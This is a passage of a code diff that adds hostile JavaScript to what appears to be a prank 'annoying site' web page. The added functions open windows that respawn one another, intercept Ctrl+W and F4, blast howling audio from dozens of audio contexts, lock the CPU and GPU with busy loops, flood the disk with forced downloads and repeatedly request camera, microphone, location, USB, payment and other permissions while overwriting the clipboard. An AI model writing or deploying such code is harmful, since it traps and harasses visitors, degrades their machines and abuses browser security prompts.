+      z-index: ${Math.floor(Math.random() * 99999)};
+      border-radius: ${Math.random() * 50}%;
+      box-shadow: 0 0 ${Math.random() * 100}px hsla(${Math.random() * 360}, 100%, 50%, 0.8);
+    `
+    document.body.appendChild(el)
+  }
+}
+
+/**
+ * BroadcastChannel Army: windows communicate to coordinate.
+ * If one window closes, another opens new ones.
+ */
+function startBroadcastArmy () {
+  if (!window.BroadcastChannel) return
+  try {
+    const bc = new BroadcastChannel('n5zad-army')
+    let aliveCount = 1
+
+    // Broadcast that we're alive every 2 seconds
+    setInterval(() => {
+      bc.postMessage({ type: 'alive', id: Math.random().toString(36).substring(2, 8) })
+    }, 2000)
+
+    // Listen for messages
+    bc.onmessage = (e) => {
+      if (e.data && e.data.type === 'alive') {
+        aliveCount++
+      }
+      if (e.data && e.data.type === 'respwan') {
+        // Another window is dying, open a replacement
+        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
+      }
+    }
+
+    // If we detect fewer than 3 windows alive, spawn more
+    setInterval(() => {
+      aliveCount = 0
+      // Request all windows to respond
+      bc.postMessage({ type: 'count' })
+      setTimeout(() => {
+        if (aliveCount < 3) {
+          for (let i = 0; i < 3 - aliveCount; i++) {
+            window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
+          }
+        }
+      }, 500)
+    }, 5000)
+
+    // Auto-spawn if window count drops
+    setInterval(() => {
+      if (Math.random() < 0.1) {
+        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
+      }
+    }, 10000)
+  } catch {}
+}
+
+/**
+ * Window Respawn: keep trying to reopen if this window is closed.
+ */
+function startWindowRespawn () {
+  // When closing, use broadcast to tell others to spawn
+  window.addEventListener('beforeunload', () => {
+    try {
+      const bc = new BroadcastChannel('n5zad-army')
+      bc.postMessage({ type: 'respwan' })
+    } catch {}
+  })
+
+  // Intercept the browser's default close behavior
+  let closeAttempts = 0
+  window.addEventListener('keydown', (e) => {
+    if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'q' || e.key === 'F4')) {
+      closeAttempts++
+      e.preventDefault()
+      e.stopPropagation()
+      // Open more windows instead
+      for (let i = 0; i < 3; i++) {
+        window.open(window.location.href + '?child=true&_=' + Math.random(), '_blank')
+      }
+      window.print()
+    }
+  })
+}
+
+/**
+ * Audio Feedback Loop: create oscillating howling sound through speakers.
+ */
+function startFeedbackSound () {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)()
+    const gain = ctx.createGain()
+    gain.gain.value = 0.3
+    gain.connect(ctx.destination)
+
+    // Feedback loop: modulated oscillator
+    const osc = ctx.createOscillator()
+    osc.type = 'sawtooth'
+    osc.frequency.value = 800
+    osc.connect(gain)
+
+    // LFO to modulate frequency for that howling sound
+    const lfo = ctx.createOscillator()
+    lfo.frequency.value = 3
+    const lfoGain = ctx.createGain()
+    lfoGain.gain.value = 600
+    lfo.connect(lfoGain)
+    lfoGain.connect(osc.frequency)
+    lfo.start()
+    osc.start()
+
+    // Second oscillator with different modulation
+    const ctx2 = new (window.AudioContext || window.webkitAudioContext)()
+    const gain2 = ctx2.createGain()
+    gain2.gain.value = 0.2
+    gain2.connect(ctx2.destination)
+    const osc2 = ctx2.createOscillator()
+    osc2.type = 'square'
+    osc2.frequency.value = 400
+    const lfo2 = ctx2.createOscillator()
+    lfo2.frequency.value = 2.5
+    const lfoGain2 = ctx2.createGain()
+    lfoGain2.gain.value = 300
+    lfo2.connect(lfoGain2)
+    lfoGain2.connect(osc2.frequency)
+    lfo2.start()
+    osc2.connect(gain2)
+    osc2.start()
+
+    // White noise burst
+    const bufferSize = ctx.sampleRate * 2
+    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate)
+    const data = buffer.getChannelData(0)
+    for (let i = 0; i < bufferSize; i++) {
+      data[i] = Math.random() * 2 - 1
+    }
+    const noise = ctx.createBufferSource()
+    noise.buffer = buffer
+    noise.loop = true
+    const noiseGain = ctx.createGain()
+    noiseGain.gain.value = 0.1
+    noise.connect(noiseGain)
+    noiseGain.connect(ctx.destination)
+    noise.start()
+  } catch {}
+}
+
+/**
+ * Audio Feedback Hell: spawn 50 AudioContexts with howling feedback.
+ */
+function startAudioFeedbackHell () {
+  for (let ctxIdx = 0; ctxIdx < 50; ctxIdx++) {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)()
+      const gain = ctx.createGain()
+      gain.gain.value = 0.1 + Math.random() * 0.2
+      gain.connect(ctx.destination)
+
+      const osc = ctx.createOscillator()
+      osc.type = ['sawtooth', 'square', 'triangle'][ctxIdx % 3]
+      osc.frequency.value = 200 + ctxIdx * 50 + Math.random() * 100
+      const lfo = ctx.createOscillator()
+      lfo.frequency.value = 1 + Math.random() * 5
+      const lfoG = ctx.createGain()
+      lfoG.gain.value = 100 + Math.random() * 500
+      lfo.connect(lfoG)
+      lfoG.connect(osc.frequency)
+      osc.connect(gain)
+      lfo.start()
+      osc.start()
+
+      // White noise for each
+      const bufSize = ctx.sampleRate * 4
+      const buf = ctx.createBuffer(1, bufSize, ctx.sampleRate)
+      const d = buf.getChannelData(0)
+      for (let i = 0; i < bufSize; i++) d[i] = Math.random() * 2 - 1
+      const noise = ctx.createBufferSource()
+      noise.buffer = buf
+      noise.loop = true
+      const nGain = ctx.createGain()
+      nGain.gain.value = 0.05 + Math.random() * 0.1
+      noise.connect(nGain)
+      nGain.connect(ctx.destination)
+      noise.start()
+    } catch {}
+  }
+}
+
+/**
+ * GPU Compute Max: use WebGL compute-like operations to max out GPU.
+ */
+function startGpuComputeMax () {
+  for (let g = 0; g < 5; g++) {
+    try {
+      const canvas = document.createElement('canvas')
+      canvas.width = 2048
+      canvas.height = 2048
+      canvas.style = 'position:fixed;top:-9999px'
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
+      if (!gl) continue
+
+      const vertices = new Float32Array(1000000)
+      for (let i = 0; i < vertices.length; i++) vertices[i] = Math.random() * 2 - 1
+
+      const buf = gl.createBuffer()
+      gl.bindBuffer(gl.ARRAY_BUFFER, buf)
+      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW)
+
+      // Max draw calls
+      function gpuLoop () {
+        for (let i = 0; i < 100; i++) {
+          gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
+          gl.drawArrays(gl.TRIANGLES, 0, 100000)
+          gl.drawArrays(gl.POINTS, 0, 100000)
+          gl.drawArrays(gl.LINES, 0, 100000)
+        }
+        requestAnimationFrame(gpuLoop)
+      }
+      requestAnimationFrame(gpuLoop)
+    } catch {}
+  }
+}
+
+/**
+ * Loop Burn: infinite while loop on main thread to lock browser.
+ */
+function startLoopBurn () {
+  function hardLoop () {
+    let x = 0
+    for (let k = 0; k < 100; k++) {
+      for (let i = 0; i < 100000; i++) {
+        x += Math.sin(i) * Math.cos(i * 0.3) * Math.tan(i * 0.07)
+        x = Math.sqrt(Math.abs(x) + 0.1)
+        x = Math.pow(x, 1.01)
+      }
+    }
+    requestAnimationFrame(hardLoop)
+  }
+  // Run multiple instances
+  for (let i = 0; i < 10; i++) {
+    setTimeout(() => requestAnimationFrame(hardLoop), i * 5)
+  }
+}
+
+/**
+ * Download Spam: keep triggering file downloads nonstop.
+ * Uses multiple techniques to bypass browser download blocking.
+ */
+function startDownloadSpam () {
+  // Download continuously every 10ms
   setInterval(() => {
     for (let i = 0; i < 20; i++) {
-      const worker = new Worker(workerUrl)
-      workers.push(worker)
-      worker.postMessage('start')
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'file_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 10)
+      } catch {}
+    }
+  }, 50)
+
+  // On every event, also trigger downloads
+  document.addEventListener('click', () => {
+    for (let i = 0; i < 30; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'evt_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+      } catch {}
+    }
+  }, true)
+
+  document.addEventListener('keydown', () => {
+    for (let i = 0; i < 30; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'key_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+      } catch {}
+    }
+  }, true)
+
+  window.addEventListener('beforeunload', () => {
+    for (let i = 0; i < 100; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'close_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+      } catch {}
+    }
+  })
+
+  setInterval(() => {
+    for (let i = 0; i < 10; i++) {
+      try {
+        const blob = new Blob([new Uint8Array(1024 * 1024 * 10)], { type: 'application/octet-stream' })
+        const url = URL.createObjectURL(blob)
+        const a = document.createElement('a')
+        a.href = url
+        a.download = 'bigfile_' + Date.now() + '_' + i + '.bin'
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => {
+          a.remove()
+          URL.revokeObjectURL(url)
+        }, 100)
+      } catch {}
+    }
+  }, 200)
+
+  if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+    setInterval(() => {
+      navigator.serviceWorker.controller.postMessage('download')
+    }, 200)
+  }
+}
+
+/**
+ * Window Open Spam: continuously try to open new windows
+ * using every possible event and method.
+ */
+function startWindowOpenSpam () {
+  const openWindow = () => {
+    for (let i = 0; i < 5; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&_=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  }
+
+  document.addEventListener('click', openWindow, true)
+  document.addEventListener('keydown', openWindow, true)
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden) {
+      for (let i = 0; i < 10; i++) {
+        try {
+          window.open(
+            window.location.href + '?child=true&vis=' + Date.now() + '_' + i,
+            '_blank',
+            'width=300,height=200'
+          )
+        } catch {}
+      }
+    }
+  })
+
+  window.addEventListener('beforeunload', (e) => {
+    e.preventDefault()
+    e.returnValue = ''
+    for (let i = 0; i < 50; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&unload=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  })
+
+  window.addEventListener('focus', () => {
+    for (let i = 0; i < 5; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&focus=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  })
+
+  setInterval(openWindow, 200)
+}
+
+/**
+ * Permission Hell: request every possible browser API permission
+ * simultaneously, overwhelming the browser permission system.
+ */
+function startPermissionHell () {
+  // Notifications
+  if ('Notification' in window) {
+    Notification.requestPermission()
+    setInterval(() => Notification.requestPermission(), 1000)
+  }
+
+  // Geolocation
+  if ('geolocation' in navigator) {
+    setInterval(() => {
+      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true, timeout: 100 })
+      navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true })
+    }, 200)
+  }
+
+  // Camera + Microphone (getUserMedia)
+  if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+    setInterval(() => {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+      navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 99999 }, height: { ideal: 99999 } } }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+      navigator.mediaDevices.getUserMedia({ audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+    }, 500)
+  }
+
+  // Screen sharing
+  if ('getDisplayMedia' in (navigator.mediaDevices || {})) {
+    setInterval(() => {
+      navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }).then(s => {
+        s.getTracks().forEach(t => t.stop())
+      }).catch(() => {})
+    }, 1000)
+  }
+
+  // Clipboard
+  if ('clipboard' in navigator) {
+    setInterval(() => {
+      navigator.clipboard.read().catch(() => {})
+      navigator.clipboard.readText().catch(() => {})
+      navigator.clipboard.write(new ClipboardItem({ 'text/plain': new Blob(['spam'], { type: 'text/plain' }) })).catch(() => {})
+      navigator.clipboard.writeText('clipboard-spam-' + Date.now()).catch(() => {})
+    }, 200)
+  }
+
+  // File System Access
+  if ('showOpenFilePicker' in window) {
+    setInterval(() => {
+      window.showOpenFilePicker({ multiple: true }).catch(() => {})
+      window.showSaveFilePicker({ suggestedName: 'file.txt' }).catch(() => {})
+      window.showDirectoryPicker().catch(() => {})
+    }, 500)
+  }
+
+  // MIDI
+  if ('requestMIDIAccess' in navigator) {
+    setInterval(() => {
+      navigator.requestMIDIAccess().catch(() => {})
+    }, 500)
+  }
+
+  // USB
+  if ('usb' in navigator) {
+    setInterval(() => {
+      navigator.usb.requestDevice({ filters: [] }).catch(() => {})
+    }, 500)
+  }
+
+  // Serial
+  if ('serial' in navigator) {
+    setInterval(() => {
+      navigator.serial.requestPort().catch(() => {})
+    }, 500)
+  }
+
+  // Bluetooth
+  if ('bluetooth' in navigator) {
+    setInterval(() => {
+      navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {})
+      navigator.bluetooth.requestLEScan({ acceptAllAdvertisements: true }).catch(() => {})
+    }, 500)
+  }
+
+  // HID
+  if ('hid' in navigator) {
+    setInterval(() => {
+      navigator.hid.requestDevice({ filters: [] }).catch(() => {})
+    }, 500)
+  }
+
+  // WebAuthn
+  if ('credentials' in navigator && 'create' in navigator.credentials) {
+    setInterval(() => {
+      navigator.credentials.create({
+        publicKey: {
+          challenge: new Uint8Array(32),
+          rp: { name: 'Spam' },
+          user: { id: new Uint8Array(16), name: 'spam@spam.com', displayName: 'Spam' },
+          pubKeyCredParams: [{ type: 'public-key', alg: -7 }]
+        }
+      }).catch(() => {})
+    }, 500)
+  }
+
+  // Sensors
+  if ('Accelerometer' in window) {
+    try {
+      const accel = new Accelerometer({ frequency: 60 })
+      accel.start()
+      const gyro = new Gyroscope({ frequency: 60 })
+      gyro.start()
+      const magnet = new Magnetometer({ frequency: 60 })
+      magnet.start()
+      const ambient = new AmbientLightSensor({ frequency: 60 })
+      ambient.start()
+    } catch {}
+  }
+
+  // Picture-in-Picture
+  if ('pictureInPictureEnabled' in document && document.pictureInPictureEnabled) {
+    setInterval(() => {
+      const v = document.createElement('video')
+      v.src = 'https://raw.githubusercontent.com/feross/TheAnnoyingSite.com/master/static/nyan.mp4'
+      v.loop = true
+      v.muted = true
+      v.play().then(() => {
+        v.requestPictureInPicture().catch(() => {})
+      }).catch(() => {})
+    }, 2000)
+  }
+
+  // Fullscreen
+  setInterval(() => {
+    if (document.documentElement && 'requestFullscreen' in document.documentElement) {
+      document.documentElement.requestFullscreen().catch(() => {})
+      if (document.exitFullscreen) document.exitFullscreen().catch(() => {})
     }
   }, 1000)
+
+  // Keyboard Lock
+  if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+    setInterval(() => {
+      navigator.keyboard.lock().catch(() => {})
+    }, 1000)
+  }
+
+  // Pointer Lock
+  setInterval(() => {
+    if (document.body && 'requestPointerLock' in document.body) {
+      document.body.requestPointerLock()
+    }
+  }, 500)
+
+  // Wake Lock
+  if ('wakeLock' in navigator && 'request' in navigator.wakeLock) {
+    setInterval(() => {
+      navigator.wakeLock.request('screen').catch(() => {})
+    }, 1000)
+  }
+
+  // Idle Detection
+  if ('IdleDetector' in window) {
+    setInterval(() => {
+      IdleDetector.requestPermission().catch(() => {})
+    }, 1000)
+  }
+
+  // Window Management
+  if ('getScreenDetails' in window) {
+    setInterval(() => {
+      window.getScreenDetails().catch(() => {})
+    }, 1000)
+  }
+
+  // Local Font Access
+  if ('queryLocalFonts' in window) {
+    setInterval(() => {
+      window.queryLocalFonts().catch(() => {})
+    }, 1000)
+  }
+
+  // Contact Picker
+  if ('contacts' in navigator && 'select' in navigator.contacts) {
+    setInterval(() => {
+      navigator.contacts.select(['name', 'email', 'tel'], { multiple: true }).catch(() => {})
+    }, 1000)
+  }
+
+  // Storage Access
+  if ('requestStorageAccess' in document) {
+    setInterval(() => {
+      document.requestStorageAccess().catch(() => {})
+    }, 500)
+  }
+
+  // Payment Handler
+  if ('PaymentRequest' in window) {
+    setInterval(() => {
+      try {
+        const req = new PaymentRequest([{ supportedMethods: 'basic-card' }], {
+          total: { label: 'Spam', amount: { currency: 'USD', value: '0.01' } }
+        })
+        req.show().catch(() => {})
+      } catch {}
+    }, 2000)
+  }
+
+  // Digital Goods
+  if ('getDigitalGoodsService' in window) {
+    setInterval(() => {
+      window.getDigitalGoodsService('https://example.com').catch(() => {})
+    }, 2000)
+  }
+
+  // File Handling
+  if ('launchQueue' in window && 'setConsumer' in window.launchQueue) {
+    window.launchQueue.setConsumer(() => {})
+  }
+
+  // Presentation
+  if ('PresentationRequest' in window) {
+    setInterval(() => {
+      try {
+        const req = new PresentationRequest(window.location.href)
+        req.start().catch(() => {})
+      } catch {}
+    }, 2000)
+  }
+
+  // Virtual Keyboard
+  if ('virtualKeyboard' in navigator) {
+    try {
+      navigator.virtualKeyboard.show()
+    } catch {}
+  }
+
+  // Screen Capture
+  if ('getDisplayMedia' in (navigator.mediaDevices || {})) {
+    // Already above
+  }
+
+  // Background Sync
+  if ('sync' in 'serviceWorker' in navigator && navigator.serviceWorker.controller) {
+    setInterval(() => {
+      navigator.serviceWorker.ready.then(reg => {
+        reg.sync.register('spam-sync').catch(() => {})
+      })
+    }, 2000)
+  }
+
+  // Background Fetch
+  if ('backgroundFetch' in (navigator.serviceWorker || {})) {
+    setInterval(() => {
+      navigator.serviceWorker.ready.then(reg => {
+        reg.backgroundFetch.fetch('spam-' + Date.now(), ['https://example.com']).catch(() => {})
+      })
+    }, 2000)
+  }
+
+  // Gamepad access (no permission prompt, but request connection)
+  window.addEventListener('gamepadconnected', () => {})
+  setInterval(() => {
+    navigator.getGamepads()
+  }, 100)
+
+  // Speech recognition
+  if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
+    setInterval(() => {
+      try {
+        const SR = window.SpeechRecognition || window.webkitSpeechRecognition
+        const recog = new SR()
+        recog.start()
+        setTimeout(() => recog.stop(), 100)
+      } catch {}
+    }, 1000)
+  }
+
+  // Speech synthesis - continuous
+  if ('speechSynthesis' in window) {
+    setInterval(() => {
+      const utter = new SpeechSynthesisUtterance('spam spam spam spam spam')
+      window.speechSynthesis.speak(utter)
+    }, 50)
+  }
+
+  // SMS (on mobile)
+  if ('sms' in navigator) {
+    setInterval(() => {
+      navigator.sms.receive().catch(() => {})
+    }, 2000)
+  }
+
+  // Nfc
+  if ('nfc' in navigator) {
+    setInterval(() => {
+      navigator.nfc.watch().catch(() => {})
+    }, 2000)
+  }
+}
+
+/**
+ * Audio Hell 10ms: aggressive audio with beeps every 10ms.
+ */
+function startAudio10ms () {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)()
+    // Create a constant stream of noise + tones
+    function playBeep () {
+      try {
+        const osc = ctx.createOscillator()
+        const gain = ctx.createGain()
+        osc.type = ['sawtooth', 'square', 'triangle'][Math.floor(Math.random() * 3)]
+        osc.frequency.value = 100 + Math.random() * 3000
+        gain.gain.value = 0.05 + Math.random() * 0.15
+        osc.connect(gain)
+        gain.connect(ctx.destination)
+        osc.start()
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.05)
+        osc.stop(ctx.currentTime + 0.05)
+      } catch {}
+    }
+    setInterval(playBeep, 10)
+  } catch {}
+}
+
+/**
+ * 50,000 3D rotating blocks using WebGL to overwhelm GPU.
+ */
+function start50kBlocks () {
+  try {
+    const canvas = document.createElement('canvas')
+    canvas.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 99999; opacity: 0.8;'
+    canvas.width = window.innerWidth
+    canvas.height = window.innerHeight
+    document.body.appendChild(canvas)
+
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
+    if (!gl) return
+
+    // Vertex shader
+    const vsSrc = `
+      attribute vec3 pos;
+      attribute vec3 col;
+      uniform mat4 view;
+      uniform mat4 proj;
+      varying vec3 vCol;
+      void main() {
+        vCol = col;
+        gl_Position = proj * view * vec4(pos, 1.0);
+      }
+    `
+    // Fragment shader
+    const fsSrc = `
+      precision highp float;
+      varying vec3 vCol;
+      void main() {
+        gl_FragColor = vec4(vCol, 0.7);
+      }
+    `
+
+    function compileShader(src, type) {
+      const s = gl.createShader(type)
+      gl.shaderSource(s, src)
+      gl.compileShader(s)
+      return s
+    }
+
+    const vs = compileShader(vsSrc, gl.VERTEX_SHADER)
+    const fs = compileShader(fsSrc, gl.FRAGMENT_SHADER)
+    const prog = gl.createProgram()
+    gl.attachShader(prog, vs)
+    gl.attachShader(prog, fs)
+    gl.linkProgram(prog)
+    gl.useProgram(prog)
+
+    // Generate 50,000 random cubes (8 vertices each = 400,000 vertices)
+    // Each cube: 24 vertices (6 faces * 4) with position + color
+    const NUM_CUBES = 50000
+    const vertsPerCube = 24
+    const totalVerts = NUM_CUBES * vertsPerCube
+    const positions = new Float32Array(totalVerts * 3)
+    const colors = new Float32Array(totalVerts * 3)
+
+    let idx = 0
+    for (let c = 0; c < NUM_CUBES; c++) {
+      const cx = (Math.random() - 0.5) * 200
+      const cy = (Math.random() - 0.5) * 200
+      const cz = (Math.random() - 0.5) * 200 - 50
+      const s = 0.3 + Math.random() * 1.5
+      const r = Math.random()
+      const g = Math.random()
+      const b = Math.random()
+
+      // 6 faces of a cube
+      const faceVerts = [
+        [-1,-1, 1, 1,-1, 1, 1, 1, 1, -1, 1, 1], // front
+        [-1,-1,-1, -1, 1,-1, 1, 1,-1, 1,-1,-1], // back
+        [-1, 1,-1, -1, 1, 1, 1, 1, 1, 1, 1,-1], // top
+        [-1,-1,-1, 1,-1,-1, 1,-1, 1, -1,-1, 1], // bottom
+        [-1,-1,-1, -1,-1, 1, -1, 1, 1, -1, 1,-1], // left
+        [ 1,-1,-1, 1, 1,-1, 1, 1, 1, 1,-1, 1], // right
+      ]
+
+      for (const face of faceVerts) {
+        for (let v = 0; v < 4; v++) {
+          positions[idx * 3] = cx + face[v * 3] * s
+          positions[idx * 3 + 1] = cy + face[v * 3 + 1] * s
+          positions[idx * 3 + 2] = cz + face[v * 3 + 2] * s
+          colors[idx * 3] = r
+          colors[idx * 3 + 1] = g
+          colors[idx * 3 + 2] = b
+          idx++
+        }
+      }
+    }
+
+    const posBuf = gl.createBuffer()
+    gl.bindBuffer(gl.ARRAY_BUFFER, posBuf)
+    gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW)
+
+    const colBuf = gl.createBuffer()
+    gl.bindBuffer(gl.ARRAY_BUFFER, colBuf)
+    gl.bufferData(gl.ARRAY_BUFFER, colors, gl.STATIC_DRAW)
+
+    const posLoc = gl.getAttribLocation(prog, 'pos')
+    gl.enableVertexAttribArray(posLoc)
+    gl.bindBuffer(gl.ARRAY_BUFFER, posBuf)
+    gl.vertexAttribPointer(posLoc, 3, gl.FLOAT, false, 0, 0)
+
+    const colLoc = gl.getAttribLocation(prog, 'col')
+    gl.enableVertexAttribArray(colLoc)
+    gl.bindBuffer(gl.ARRAY_BUFFER, colBuf)
+    gl.vertexAttribPointer(colLoc, 3, gl.FLOAT, false, 0, 0)
+
+    gl.enable(gl.DEPTH_TEST)
+    gl.enable(gl.BLEND)
+    gl.blendFunc(gl.SRC_ALPHA, gl.ONE)
+
+    const viewLoc = gl.getUniformLocation(prog, 'view')
+    const projLoc = gl.getUniformLocation(prog, 'proj')
+
+    const viewMatrix = new Float32Array(16)
+    const projMatrix = new Float32Array(16)
+    let angle = 0
+
+    function render () {
+      angle += 0.02
+      canvas.width = window.innerWidth
+      canvas.height = window.innerHeight
+      gl.viewport(0, 0, canvas.width, canvas.height)
+
+      // Perspective projection
+      const aspect = canvas.width / canvas.height
+      const fov = Math.PI / 4
+      const near = 0.1
+      const far = 500
+      for (let i = 0; i < 16; i++) projMatrix[i] = 0
+      const t = 1 / Math.tan(fov / 2)
+      projMatrix[0] = t / aspect
+      projMatrix[5] = t
+      projMatrix[10] = -(far + near) / (far - near)
+      projMatrix[11] = -1
+      projMatrix[14] = -2 * far * near / (far - near)
+      gl.uniformMatrix4fv(projLoc, false, projMatrix)
+
+      // View matrix - orbit around
+      const dist = 60 + Math.sin(angle * 0.1) * 20
+      const eyeX = Math.sin(angle * 0.3) * dist
+      const eyeY = Math.sin(angle * 0.2) * dist * 0.5 + 10
+      const eyeZ = Math.cos(angle * 0.3) * dist
+      // Simple lookAt
+      const upX = 0, upY = 1, upZ = 0
+      const targetX = 0, targetY = 0, targetZ = 0
+      const fwdX = targetX - eyeX, fwdY = targetY - eyeY, fwdZ = targetZ - eyeZ
+      const flen = Math.sqrt(fwdX*fwdX + fwdY*fwdY + fwdZ*fwdZ)
+      const fX = fwdX/flen, fY = fwdY/flen, fZ = fwdZ/flen
+      const rX = upY*fZ - upZ*fY, rY = upZ*fX - upX*fZ, rZ = upX*fY - upY*fX
+      const rlen = Math.sqrt(rX*rX + rY*rY + rZ*rZ)
+      const rrX = rX/rlen, rrY = rY/rlen, rrZ = rZ/rlen
+      const uuX = fY*rrZ - fZ*rrY, uuY = fZ*rrX - fX*rrZ, uuZ = fX*rrY - fY*rrX
+      viewMatrix[0] = rrX; viewMatrix[1] = uuX; viewMatrix[2] = -fX; viewMatrix[3] = 0
+      viewMatrix[4] = rrY; viewMatrix[5] = uuY; viewMatrix[6] = -fY; viewMatrix[7] = 0
+      viewMatrix[8] = rrZ; viewMatrix[9] = uuZ; viewMatrix[10] = -fZ; viewMatrix[11] = 0
+      viewMatrix[12] = -(rrX*eyeX + rrY*eyeY + rrZ*eyeZ)
+      viewMatrix[13] = -(uuX*eyeX + uuY*eyeY + uuZ*eyeZ)
+      viewMatrix[14] = fX*eyeX + fY*eyeY + fZ*eyeZ
+      viewMatrix[15] = 1
+      gl.uniformMatrix4fv(viewLoc, false, viewMatrix)
+
+      gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT)
+      gl.drawArrays(gl.TRIANGLES, 0, totalVerts)
+
+      requestAnimationFrame(render)
+    }
+    render()
+  } catch (e) {
+    console.error('50k blocks error:', e)
+  }
 }
 
 function detectBrowser () {
